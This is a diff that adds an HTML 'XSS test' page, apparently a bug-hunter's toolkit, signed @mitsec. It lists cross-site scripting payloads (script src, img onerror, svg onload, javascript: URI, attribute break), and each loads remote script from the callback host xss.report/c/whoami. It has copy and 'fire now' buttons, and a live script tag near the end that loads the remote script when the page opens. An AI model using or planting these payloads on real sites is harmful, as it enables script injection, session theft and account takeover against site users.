@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS Test Page — @mitsec</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: #0a0a0a;
+      color: #e0e0e0;
+      font-family: 'Courier New', monospace;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 2rem;
+    }
+
+    .terminal {
+      width: 100%;
+      max-width: 720px;
+      background: #111;
+      border: 1px solid #2a2a2a;
+      border-radius: 8px;
+      overflow: hidden;
+      box-shadow: 0 0 40px rgba(0,255,100,0.05);
+    }
+
+    .titlebar {
+      background: #1a1a1a;
+      padding: 10px 16px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      border-bottom: 1px solid #222;
+    }
+
+    .dot { width: 12px; height: 12px; border-radius: 50%; }
+    .dot.r { background: #ff5f56; }
+    .dot.y { background: #ffbd2e; }
+    .dot.g { background: #27c93f; }
+
+    .titlebar span {
+      margin-left: auto;
+      font-size: 11px;
+      color: #555;
+      letter-spacing: 1px;
+    }
+
+    .content {
+      padding: 2rem;
+    }
+
+    .label {
+      font-size: 11px;
+      color: #555;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      margin-bottom: 0.5rem;
+    }
+
+    .section {
+      margin-bottom: 2rem;
+    }
+
+    .payload-box {
+      background: #0d0d0d;
+      border: 1px solid #1e1e1e;
+      border-left: 3px solid #27c93f;
+      padding: 1rem 1.2rem;
+      border-radius: 4px;
+      font-size: 13px;
+      color: #27c93f;
+      word-break: break-all;
+      line-height: 1.6;
+    }
+
+    .input-field {
+      width: 100%;
+      background: #0d0d0d;
+      border: 1px solid #222;
+      border-radius: 4px;
+      padding: 0.8rem 1rem;
+      color: #e0e0e0;
+      font-family: 'Courier New', monospace;
+      font-size: 13px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+    .input-field:focus { border-color: #27c93f44; }
+
+    .btn-row {
+      display: flex;
+      gap: 0.8rem;
+      flex-wrap: wrap;
+      margin-top: 1.5rem;
+    }
+
+    button {
+      background: transparent;
+      border: 1px solid #333;
+      color: #aaa;
+      padding: 0.55rem 1.2rem;
+      border-radius: 4px;
+      font-family: 'Courier New', monospace;
+      font-size: 12px;
+      cursor: pointer;
+      transition: all 0.15s;
+      letter-spacing: 0.5px;
+    }
+    button:hover { border-color: #27c93f; color: #27c93f; }
+    button.primary { border-color: #27c93f55; color: #27c93f; }
+    button.primary:hover { background: #27c93f15; }
+
+    .status {
+      font-size: 12px;
+      color: #555;
+      margin-top: 1.5rem;
+      line-height: 1.8;
+    }
+    .status span { color: #27c93f; }
+
+    .divider {
+      height: 1px;
+      background: #1a1a1a;
+      margin: 1.5rem 0;
+    }
+
+    .tag {
+      display: inline-block;
+      background: #1a1a1a;
+      border: 1px solid #2a2a2a;
+      color: #777;
+      font-size: 10px;
+      padding: 2px 8px;
+      border-radius: 20px;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+    }
+
+    .reflected { color: #e0e0e0; }
+    .reflected mark {
+      background: transparent;
+      color: #ff6b6b;
+    }
+
+    #output {
+      min-height: 40px;
+      padding: 1rem;
+      background: #0d0d0d;
+      border: 1px solid #1e1e1e;
+      border-radius: 4px;
+      font-size: 13px;
+      color: #aaa;
+      margin-top: 0.8rem;
+    }
+  </style>
+</head>
+<body>
+
+<div class="terminal">
+  <div class="titlebar">
+    <div class="dot r"></div>
+    <div class="dot y"></div>
+    <div class="dot g"></div>
+    <span>xss-test // @mitsec</span>
+  </div>
+
+  <div class="content">
+
+    <!-- Payload -->
+    <div class="section">
+      <div class="label">Active Payload</div>
+      <div class="payload-box" id="payloadDisplay">
+        '"><script src=https://xss.report/c/whoami></script>
+      </div>
+    </div>
+
+    <div class="divider"></div>
+
+    <!-- Reflected XSS sim -->
+    <div class="section">
+      <div class="label">Reflected Input Simulation</div>
+      <input
+        class="input-field"
+        type="text"
+        id="reflectedInput"
+        placeholder="Paste target input here to simulate reflection..."
+        value="'&quot;><script src=https://xss.report/c/whoami></script>"
+      />
+      <div id="output">← Output renders here</div>
+    </div>
+
+    <div class="divider"></div>
+
+    <!-- Variants -->
+    <div class="section">
+      <div class="label">Quick Variants</div>
+
+      <div style="display:flex; flex-direction:column; gap:0.6rem; margin-top:0.5rem;">
+
+        <div style="display:flex; align-items:center; gap:0.8rem;">
+          <span class="tag">script src</span>
+          <code style="font-size:12px; color:#888;">
+            '"><script src=https://xss.report/c/whoami></script>
+          </code>
+        </div>
+
+        <div style="display:flex; align-items:center; gap:0.8rem;">
+          <span class="tag">img onerror</span>
+          <code style="font-size:12px; color:#888;">
+            "><img src=x onerror="import('https://xss.report/c/whoami')">
+          </code>
+        </div>
+
+        <div style="display:flex; align-items:center; gap:0.8rem;">
+          <span class="tag">svg onload</span>
+          <code style="font-size:12px; color:#888;">
+            "><svg onload="import('https://xss.report/c/whoami')">
+          </code>
+        </div>
+
+        <div style="display:flex; align-items:center; gap:0.8rem;">
+          <span class="tag">js uri</span>
+          <code style="font-size:12px; color:#888;">
+            javascript:import('https://xss.report/c/whoami')
+          </code>
+        </div>
+
+        <div style="display:flex; align-items:center; gap:0.8rem;">
+          <span class="tag">attr break</span>
+          <code style="font-size:12px; color:#888;">
+            "onmouseover="import('https://xss.report/c/whoami')
+          </code>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- Buttons -->
+    <div class="btn-row">
+      <button class="primary" onclick="copyPayload()">copy payload</button>
+      <button onclick="fireNow()">fire now (local)</button>
+      <button onclick="clearOutput()">clear output</button>
+    </div>
+
+    <div class="status" id="statusMsg">
+      status: <span>ready</span> · callback: <span>xss.report/c/whoami</span>
+    </div>
+
+  </div>
+</div>
+
+<!-- The actual XSS payload fires here -->
+'"><script src=https://xss.report/c/whoami></script>
+
+<script>
+  // Reflect input to output (for simulation)
+  const input = document.getElementById('reflectedInput');
+  const output = document.getElementById('output');
+
+  function reflect() {
+    // Shows as text (escaped) - simulates what a vulnerable page would show
+    output.textContent = '← reflected: ' + input.value;
+  }
+
+  input.addEventListener('input', reflect);
+  reflect();
+
+  function copyPayload() {
+    const payload = `'"><script src=https://xss.report/c/whoami><\/script>`;
+    navigator.clipboard.writeText(payload).then(() => {
+      document.getElementById('statusMsg').innerHTML =
+        'status: <span>copied ✓</span> · payload in clipboard';
+    });
+  }
+
+  function fireNow() {
+    // Dynamically creates a script tag — fires the real callback
+    const s = document.createElement('script');
+    s.src = 'https://xss.report/c/whoami';
+    document.body.appendChild(s);
+    document.getElementById('statusMsg').innerHTML =
+      'status: <span>fired ✓</span> · check xss.report dashboard';
+  }
+
+  function clearOutput() {
+    output.textContent = '← cleared';
+    document.getElementById('statusMsg').innerHTML =
+      'status: <span>ready</span> · callback: <span>xss.report/c/whoami</span>';
+  }
+</script>
+
+</body>
+</html>
